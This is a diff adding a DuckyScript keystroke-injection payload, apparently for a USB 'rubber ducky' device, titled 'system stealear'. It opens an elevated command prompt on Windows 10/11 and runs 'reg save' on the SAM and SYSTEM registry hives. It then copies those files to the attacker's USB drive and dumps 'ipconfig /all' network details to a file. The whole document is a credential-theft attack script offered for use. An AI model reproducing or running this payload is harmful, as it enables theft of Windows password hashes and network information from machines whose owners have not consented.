@@ -1,0 +1,165 @@
+REM Title: system stealear
+REM Author: youssef mohamed fathy
+REM Description: steal windows sam and system files
+REM Target: WINDOWS 10,11
+REM Requirements: usb flash drive
+
+DELAY 2000
+
+CONTROL-ESC
+
+DELAY 200
+
+UPARROW
+
+DELAY 200
+
+UPARROW
+
+DELAY 200
+
+UPARROW
+
+DELAY 200
+
+UPARROW
+
+DELAY 200
+
+PAGEUP
+
+CTRL-SHIFT
+
+DELAY 2000
+
+ENTER
+
+DELAY 3000
+
+LEFTARROW
+
+DELAY 3000
+
+ENTER
+
+STRING reg save HKLM\sam ./sam.save
+ENTER
+STRING reg save HKLM\system ./system.save
+
+ENTER
+
+DELAY 2000
+
+STRING explorer .
+
+ENTER
+
+DELAY 3000
+
+CTRL-F
+
+DELAY 2000
+
+STRING sam.save
+
+ENTER
+
+DELAY 1000
+
+DOWNARROW 
+
+CTRL-C
+
+DELAY 2000
+
+REM you can replace ctrl-alt-z with your usb flash drive shortcut
+
+CTRL-ALT-Z
+
+DELAY 1000
+
+CTRL-V
+
+DELAY 2000
+
+WINDOWS-S
+
+STRING cmd
+
+ENTER
+
+DELAY 2000
+
+STRING explorer .
+
+DELAY 2000
+
+CTRL-F 
+
+DELAY 2000
+
+STRING system.save
+
+ENTER
+
+DELAY 2000
+
+DOWNARROW
+
+DELAY 1000
+
+CTRL-C
+
+DELAY 2000
+
+CTRL-ALT-Z
+
+DELAY 3000
+
+CTRL-V
+
+ALT-F4
+
+REM steal ip configuration
+
+WINDOWS-r
+
+STRING cmd
+
+ENTER
+
+DELAY 2000
+
+REM replace usb drive with your usb name
+
+STRING cd userprofile/(usb drive) 
+
+ENTER
+
+DELAY 5000
+
+STRING ipconfig /all
+
+ENTER
+
+DELAY 6000
+
+STRING ipconfig /all > Data.txt
+
+ENTER
+
+DELAY 1000
+
+ALT-f4
+
+
+
+
+
+
+
+
+
+
+
+
